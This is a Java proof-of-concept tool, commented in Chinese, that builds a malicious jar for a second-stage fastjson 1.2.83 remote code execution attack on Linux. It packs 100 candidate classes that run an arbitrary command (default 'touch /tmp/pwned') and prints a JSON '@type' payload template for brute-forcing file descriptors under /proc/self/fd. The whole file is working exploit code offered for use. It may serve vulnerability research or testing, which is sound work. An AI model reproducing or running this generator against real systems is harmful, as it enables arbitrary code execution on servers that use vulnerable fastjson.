package PoC_1283;

import picocli.CommandLine;
import picocli.CommandLine.ArgGroup;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.Callable;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * 生成 fastjson 1.2.83 RCE 【二阶段 · jar:file 本地 fd 加载】的恶意 jar。
 *
 * 背景：JDK9+ 一阶段（jar:http://）因 JVM 对连续 // 的类名校验失败，只能 SSRF。
 * 但 JVM 通过 jar:http 下载 jar 后会缓存到 /tmp/jar_cache*.tmp 并删除文件、保留 fd，
 * 于是可用 jar:file:/proc/self/fd/N!/X 读回该 fd 里的 jar 完成类加载（Linux）。
 * 由于 fd 号未知，jar 里预置 fd1~fd100 共 100 个候选类，逐个爆破。
 *
 * 使用：
 *   java -cp ... PoC_1283.GenFileProbe (--cmd C | --code JAVA | --code-file F) [--out O]
 * 缺省 payload = --cmd "touch /tmp/pwned"；详见 --help。
 * 爆破 payload（N = fd 号，1..100）：
 *   {"@type":"jar:file:.proc.self.fd.<N>!.E<N>","x":1}
 */
@Command(name = "GenFileProbe", mixinStandardHelpOptions = true,
        description = "生成 fastjson 1.2.83 二阶段 jar:file:/proc/self/fd/N 爆破 jar（fd1~fd100）")
public class GenFileProbe implements Callable<Integer> {

    /** 爆破范围 */
    static final int FD_MIN = 1;
    static final int FD_MAX = 100;

    @ArgGroup(exclusive = true, heading = "payload（三选一，缺省 = --cmd \"touch /tmp/pwned\"）%n")
    Modes modes;

    @Option(names = "--out", defaultValue = "www/probe_file", description = "输出 jar 路径（自动创建父目录）")
    String out;

    @Override
    public Integer call() throws Exception {
        String body = Modes.bodyOrDefault(modes, "touch /tmp/pwned");

        PocIO.ensureParent(out);
        try (JarOutputStream jos = new JarOutputStream(Files.newOutputStream(Paths.get(out)))) {
            for (int fd = FD_MIN; fd <= FD_MAX; fd++) {
                String className   = "E" + fd;                          // jar 内 entry 名 / 合法类名
                String internalName = "jar:file:/proc/self/fd/" + fd + "!/E" + fd; // this_class

                byte[] classBytes = JavassistGen.generate(internalName, body);
                jos.putNextEntry(new JarEntry(className + ".class"));
                jos.write(classBytes);
                jos.closeEntry();
            }
        }

        System.out.println("[+] jar written: " + out + " (" + (FD_MAX - FD_MIN + 1) + " candidate classes, fd " + FD_MIN + "~" + FD_MAX + ")");
        System.out.println("[+] body(mode)  : " + (modes == null ? "cmd" : modes.mode()));
        System.out.println("[+] payload 模板: {\"@type\":\"jar:file:.proc.self.fd.<N>!.E<N>\",\"x\":1}   (N = fd 号)");
        System.out.println("[+] 爆破方式    : 遍历 N = 1..100 发送 payload，命中 fd 即 RCE");
        return 0;
    }

    public static void main(String[] args) {
        System.exit(new CommandLine(new GenFileProbe()).execute(args));
    }
}
